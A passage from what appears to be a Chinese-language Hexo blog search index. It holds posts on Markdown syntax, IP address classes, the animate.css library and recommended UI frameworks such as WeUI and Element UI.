class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项：</span><br><span class="line"><span class="bullet">    -</span> 第一项嵌套的第一个元素</span><br><span class="line"><span class="bullet">    -</span> 第一项嵌套的第二个元素</span><br><span class="line"><span class="bullet">2.</span> 第二项：</span><br><span class="line"><span class="bullet">    -</span> 第二项嵌套的第一个元素</span><br><span class="line"><span class="bullet">    -</span> 第二项嵌套的第二个元素</span><br></pre></td></tr></table></figure><h2 id="8-Markdown-区块"><a href="#8-Markdown-区块" class="headerlink" title="8.Markdown 区块"></a>8.Markdown 区块</h2><p>Markdown 区块引用是在段落开头使用 &gt; 符号 ，然后后面紧跟一个空格符号：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">区块引用</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">菜鸟教程</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">学的不仅是技术更是梦想</span></span><br></pre></td></tr></table></figure><p>另外区块是可以嵌套的，一个 &gt; 符号是最外层，两个 &gt; 符号是第一层嵌套，以此类推：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">最外层</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">&gt; 第一层嵌套</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">&gt; &gt; 第二层嵌套</span></span><br></pre></td></tr></table></figure><h3 id="区块中使用列表"><a href="#区块中使用列表" class="headerlink" title="区块中使用列表"></a>区块中使用列表</h3><p>区块中使用列表实例如下：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">区块中使用列表</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">1.</span> 第一项</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">2.</span> 第二项</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">+ 第一项</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">+ 第二项</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">+ 第三项</span></span><br></pre></td></tr></table></figure><h3 id="列表中使用区块"><a href="#列表中使用区块" class="headerlink" title="列表中使用区块"></a>列表中使用区块</h3><p>如果要在列表项目内放进区块，那么就需要在 &gt; 前添加四个空格的缩进。</p><p>列表中使用区块实例如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">* </span>第一项</span><br><span class="line"><span class="code">    &gt; 菜鸟教程</span></span><br><span class="line"><span class="code">    &gt; 学的不仅是技术更是梦想</span></span><br><span class="line"><span class="bullet">* </span>第二项</span><br></pre></td></tr></table></figure><h2 id="9-Markdown-代码"><a href="#9-Markdown-代码" class="headerlink" title="9.Markdown 代码"></a>9.Markdown 代码</h2><p>如果是段落上的一个函数或片段的代码可以用反引号把它包起来（<code> </code> &#96;），例如：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`printf()`</span> 函数</span><br></pre></td></tr></table></figure><h3 id="代码区块"><a href="#代码区块" class="headerlink" title="代码区块"></a>代码区块</h3><p>代码区块使用 4 个空格或者一个制表符（Tab 键）。</p><pre><code>print(&quot;hello&quot;)</code></pre><p>你也可以用 &#96;&#96;&#96; 包裹一段代码，并指定一种语言（也可以不指定）：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">```javascript</span></span><br><span class="line"><span class="code">$(document).ready(function () &#123;</span></span><br><span class="line"><span class="code">    alert(&#x27;RUNOOB&#x27;);</span></span><br><span class="line"><span class="code">&#125;);</span></span><br><span class="line"><span class="code">```</span></span><br></pre></td></tr></table></figure><h2 id="10-Markdown-链接"><a href="#10-Markdown-链接" class="headerlink" title="10.Markdown 链接"></a>10.Markdown 链接</h2><p>链接使用方法如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[链接名称]</span>(链接地址)</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接 <span class="selector-attr">[百度一下]</span>(<span class="attribute">https</span>:<span class="comment">//www.baidu.com)</span></span><br></pre></td></tr></table></figure><p>直接使用链接地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;https:<span class="regexp">//</span>www.baidu.com&gt;</span><br></pre></td></tr></table></figure><h3 id="高级链接"><a href="#高级链接" class="headerlink" title="高级链接"></a>高级链接</h3><p>我们可以通过变量来设置一个链接，变量赋值在文档末尾进行：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个链接用 <span class="number">1</span> 作为网址变量 <span class="selector-attr">[Google]</span><span class="selector-attr">[1]</span></span><br><span class="line">这个链接用 <span class="selector-tag">runoob</span> 作为网址变量 <span class="selector-attr">[Runoob]</span><span class="selector-attr">[runoob]</span></span><br><span class="line">然后在文档的结尾为变量赋值（网址）</span><br><span class="line"></span><br><span class="line">  <span class="selector-attr">[1]</span>: <span class="selector-tag">http</span>:<span class="comment">//www.google.com/</span></span><br><span class="line">  <span class="selector-attr">[runoob]</span>: <span class="selector-tag">http</span>:<span class="comment">//www.runoob.com/</span></span><br></pre></td></tr></table></figure><h2 id="11-Markdown-图片"><a href="#11-Markdown-图片" class="headerlink" title="11.Markdown 图片"></a>11.Markdown 图片</h2><p>Markdown 图片语法格式如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址)</span><br><span class="line"></span><br><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址 &quot;可选标题&quot;)</span><br></pre></td></tr></table></figure><p>开头一个感叹号 !<br>接着一个方括号，里面放上图片的替代文字<br>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 属性的文字。</p><p>Markdown 还没有办法指定图片的高度与宽度，如果你需要的话，你可以使用普通的 <img> 标签。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://static.runoob.com/images/runoob-logo.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="12-Markdown-表格"><a href="#12-Markdown-表格" class="headerlink" title="12.Markdown 表格"></a>12.Markdown 表格</h2><p>Markdown 制作表格使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。</p><p>语法格式如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|<span class="string">  表头   </span>|<span class="string"> 表头  </span>|</span><br><span class="line">|<span class="string">  ----  </span>|<span class="string"> ----  </span>|</span><br><span class="line">|<span class="string"> 单元格  </span>|<span class="string"> 单元格 </span>|</span><br><span class="line">|<span class="string"> 单元格  </span>|<span class="string"> 单元格 </span>|</span><br></pre></td></tr></table></figure><p><strong>对齐方式</strong></p><p>我们可以设置表格的对齐方式：</p><ul><li><strong>-:</strong> 设置内容和标题栏居右对齐。</li><li><strong>:-</strong> 设置内容和标题栏居左对齐。</li><li><strong>:-:</strong> 设置内容和标题栏居中对齐。</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| 左对齐 | 右对齐 | 居中对齐 |</span><br><span class="line">| :-----| ----: | :----: |</span><br><span class="line">| 单元格 | 单元格 | 单元格 |</span><br><span class="line">| 单元格 | 单元格 | 单元格 |</span><br></pre></td></tr></table></figure><h2 id="13-Markdown-高级技巧"><a href="#13-Markdown-高级技巧" class="headerlink" title="13.Markdown 高级技巧"></a>13.Markdown 高级技巧</h2><p><strong>支持的 HTML 元素</strong><br>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。</p><p>目前支持的 HTML 元素有：<kbd> <b> <i> <em> <sup> <sub> <br>等 ，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 &lt;<span class="selector-tag">kbd</span>&gt;Ctrl&lt;/<span class="selector-tag">kbd</span>&gt;+&lt;<span class="selector-tag">kbd</span>&gt;Alt&lt;/<span class="selector-tag">kbd</span>&gt;+&lt;<span class="selector-tag">kbd</span>&gt;<span class="selector-tag">Del</span>&lt;/<span class="selector-tag">kbd</span>&gt; 重启电脑</span><br></pre></td></tr></table></figure><p><strong>转义</strong><br>Markdown 使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown 使用反斜杠转义特殊字符：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**文本加粗**</span> </span><br><span class="line">\*\* 正常显示星号 \*\*</span><br></pre></td></tr></table></figure><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line"><span class="bullet">*   </span>星号</span><br><span class="line">_   下划线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  小括号</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line"><span class="bullet">-   </span>减号</span><br><span class="line"><span class="bullet">.   </span>英文句点</span><br><span class="line">!   感叹号</span><br></pre></td></tr></table></figure><p><strong>公式</strong></p><p>当你需要在编辑器中插入数学公式时，可以使用两个美元符 $$ 包裹 TeX 或 LaTeX 格式的数学公式来实现。提交后，问答和文章页会根据需要加载 Mathjax 对数学公式进行渲染。如：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line"><span class="string">\mathbf&#123;V&#125;_1</span> <span class="string">\times</span> <span class="string">\mathbf&#123;V&#125;_2</span> =  <span class="string">\begin&#123;vmatrix&#125;</span> </span><br><span class="line"><span class="string">\mathbf&#123;i&#125;</span> &amp; <span class="string">\mathbf&#123;j&#125;</span> &amp; <span class="string">\mathbf&#123;k&#125;</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\frac&#123;\partial</span> X&#125;&#123;<span class="string">\partial</span> u&#125; &amp;  <span class="string">\frac&#123;\partial</span> Y&#125;&#123;<span class="string">\partial</span> u&#125; &amp; <span class="number">0</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\frac&#123;\partial</span> X&#125;&#123;<span class="string">\partial</span> v&#125; &amp;  <span class="string">\frac&#123;\partial</span> Y&#125;&#123;<span class="string">\partial</span> v&#125; &amp; <span class="number">0</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\end&#123;vmatrix&#125;</span></span><br><span class="line">$&#123;$tep1&#125;&#123;<span class="string">\style&#123;visibility:hidden&#125;&#123;(x+1)(x+1)&#125;&#125;</span></span><br><span class="line">$$</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> MarkDown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址划分常识</title>
      <link href="/2020/12/06/71dc04547509-q1jun/"/>
      <url>/2020/12/06/71dc04547509-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="IP地址划分常识"><a href="#IP地址划分常识" class="headerlink" title="IP地址划分常识"></a>IP地址划分常识</h1><p>IP地址的分类：</p><p><strong>A类IP地址:</strong><br><code>1.0.0.0 ~127.0.0.0</code>  255.0.0.0<br>A类网络有127个，每个网络能容纳16777214个主机<br>A:0-127，其中0代表任何地址，127为回环测试地址，因此，A类ip地址的实际范围是1-126.<br><strong>B类IP地址:</strong><br><code>128.0.0.0～191.255.255.255</code><br>B类网络有16382个，每个网络能容纳6万多个主机<br>128-191，其中128.0.0.0和191.255.0.0为保留ip，实际范围是128.1.0.0–191.254.0.0<br><strong>C类IP地址:</strong><br><code>192.0.0.0到223.255.255.255</code><br>C类网络可达209万余个，每个网络能容纳254个主机<br>其中192.0.0.0和223.255.255.0为保留ip，实际范围是192.0.1.0–223.255.254.0<br><strong>D类IP地址:</strong><br><code>224.0.0.0～239.255.255.255</code><br>用于多点广播（Multicast）<br><strong>E类IP地址:</strong><br><code>240.0.0.0～255.255.255.254</code><br>为将来使用保留</p><blockquote><p>全零（“0．0．0．0”）地址对应于当前主机。全“1”的IP地址（“255．255．255．255”）是当前子网的广播地址</p></blockquote><p>在IP地址3种主要类型里，各保留了3个区域作为私有地址，其地址范围如下：<br>    A类地址：<code>10.0.0.0～10.255.255.255 </code><br>    B类地址：<code>172.16.0.0～172.31.255.255 </code><br>    C类地址：<code>192.168.0.0～192.168.255.255</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Animate动画库</title>
      <link href="/2020/09/01/5fa232f93cd0-q1jun/"/>
      <url>/2020/09/01/5fa232f93cd0-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Animate-libraries"><a href="#Animate-libraries" class="headerlink" title="Animate_libraries"></a>Animate_libraries</h1><p>一个css样式，里面包含了可以直接引用的动画类。</p><blockquote><p>第一次在github上写项目，这是我找到的一个css开源项目animate，这里简单介绍一下这个包的用法。</p></blockquote><h2 id="查看效果预览可以打开："><a href="#查看效果预览可以打开：" class="headerlink" title="查看效果预览可以打开："></a>查看效果预览可以打开：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://animate.style/</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://animate.style/">Animate.Style效果预览</a></p><blockquote><p>我这里用的版本是V4.1.1，如果需要别的版本也可以在里面下载。<br>这边只简单介绍一下使用&#x3D;w&#x3D;。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>你可以直接在这个主页下载animate.css到你的css文件夹并配合<code>&lt;link&gt;</code>使用<br>同样你也可以直接通过下面的代码进行互联网上的获取。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span></span></span><br><span class="line"><span class="tag">    <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css&quot;</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>简单的通过在标签中加入<code>class=&quot;&quot;</code>来调用animate.css中的动漫，至于<code>class=&quot;&quot;·的</code>“”&#96;中填什么<br>就从上面的效果预览中获得对应的类名来使用啦。比如这里给图片添加一个抖动的动画：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>animate CSS style<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/animate.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;animate__animated animate__bounce&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./images/doge.jpg&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里要注意必须要先在前面加上<code>animate__animated</code>并且都是以<code>animate__</code>为前缀,里面是两个<code>_</code><br>当然，还可以给这个抖动动画还有其他的动画属性，比如:</p></blockquote><table><thead><tr><th>ClassName</th><th>属性</th></tr></thead><tbody><tr><td>animate__delay-2s</td><td>打开网页后延迟2s播放动画</td></tr><tr><td>animate__slow</td><td>设置动画播放速度为慢速(原速1s改为2s)</td></tr><tr><td>animate__slower</td><td>设置动画播放速度为更慢速(原速1s改为3s)</td></tr><tr><td>animate__fast</td><td>同理1s–&gt;800ms</td></tr><tr><td>animate__faster</td><td>同理1s–&gt;500ms</td></tr><tr><td>animate__repeat-1</td><td>重复1次</td></tr><tr><td>animate__infinite</td><td>重复无数次，一直播放</td></tr></tbody></table><p>如果还想获得更多的动画可以参考<a target="_blank" rel="noopener" href="https://animate.style/">Animate.Style效果预览</a>里面给出的动画：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/120014447-a7154500-c014-11eb-8b29-5e8492f48962.png" alt="image"><br>右侧可以直接复制动画对应的classname，添加到<code>class=&quot;&quot;</code>就好了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 动画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用UI框架推荐</title>
      <link href="/2020/06/06/9715e8564cad-q1jun/"/>
      <url>/2020/06/06/9715e8564cad-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Common-User-Interface"><a href="#Common-User-Interface" class="headerlink" title="Common-User-Interface"></a>Common-User-Interface</h1><blockquote><p>这里推荐一些常用的UI界面</p></blockquote><h2 id="We-UI"><a href="#We-UI" class="headerlink" title="We UI"></a>We UI</h2><p><a target="_blank" rel="noopener" href="https://weui.io/">WeUI</a></p><blockquote><p>WeUI 是一套同微信原生视觉体验一致的基础样式库,<br>由微信官方设计团队为微信内网页和微信小程序量身设计,令用户的使用感知更加统一。</p></blockquote><h2 id="Element-UI"><a href="#Element-UI" class="headerlink" title="Element UI"></a>Element UI</h2><p><a target="_blank" rel="noopener" href="https://element.eleme.cn/#/zh-CN/component/button">Elment UI</a></p><blockquote><p>element-ui是一个ui库，它不依赖于vue。但是却是当前和vue配合做项目开发的一个比较好的ui框架。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> UI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
